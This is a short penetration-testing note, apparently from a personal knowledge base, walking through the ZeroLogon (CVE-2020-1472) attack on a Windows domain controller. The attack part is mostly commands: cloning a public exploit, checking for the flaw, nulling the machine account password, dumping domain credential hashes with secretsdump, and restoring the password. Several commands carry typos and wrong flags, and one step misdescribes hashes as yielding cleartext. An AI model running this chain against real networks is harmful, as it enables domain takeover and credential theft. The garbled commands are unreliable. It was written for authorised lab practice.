-- -
Dangerous exploit that could take the entire network down. The vector relies on attacking a #domaincontroller and changing the admin's logon to #null. This can easily break a number of systems, so it is not advised to actually run this against a production environment as you can then halt everything. So run for practice, but don't do it on a client environment unless they specifically ask you to, and you get it in writing so they can't sue you after.  
#### Check for vuln
The code includes the exploit, but it also has a checker that sees if the domain controller is vulnerable without actually exploiting anything:
```bash
git clone https://github.com/dirkjanm/CVE-2020-1472.git
cd CVE-2020-1472
python zerologon_check.py <DC hostname> <dc ip>
python zerologon_check.py HYDRA-DC 10.0.2.16
```
#### Exploit
Remember to not fling this wildly, get client confirmation **in writing** if they want you to exploit it:
```bash
python cve-2020-1472.py <dc hostname> <dc ip>
python cve-2020-1472.py HYDRA-DC 10.0.2.16
```
#### Verify exploit
verify that the exploit ran successfully by dumping dc SAM using [[Dark Arts I/Active Directory/Post Breach/Tools/Attacks/secretsdump|secretsdump]]
```bash
# It will still ask for a password, just hit enter and leave it empty
secretsdump.py -just-dc <domain>/<dc hostname>\$@<dc ip>
secretsdump.py -just-domain MARVEL\HYDRA-DC\$@10.0.2.16
```
#### Restore DC
After you verify the exploit, you will want to document the compromise then restore the DC as quickly as possible so that you hopefully don't destroy the domain.
```bash
# Take the administrator hash from the sam dump in the verify exploit step above
# use it to get the cleartext password 
secretdump.py administrator@<dc ip> -hashes <administrator hash>
secretsdump.py administrator@10.0.2.16 -hashes <administraotr hash>

# Then use that cleartext password to restore the password on the DC
# there is a clear hex value in the dump from the above command, copy it and use it as the '-hexpass' value below.
python restorepassword.py <domain>/<dc hostname>@<dc hostname> -target-ip <dc ip> -hexpass <hex password>
python restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target0ip 10.0.2.16 -hexpass <hex pass>
```
#### Resources
- [What Is ZeroLogon?](https://www.trendmicro.com/en_us/what-is/zerologon.html)
- [Exploit / vuln checker](https://github.com/dirkjanm/CVE-2020-1472)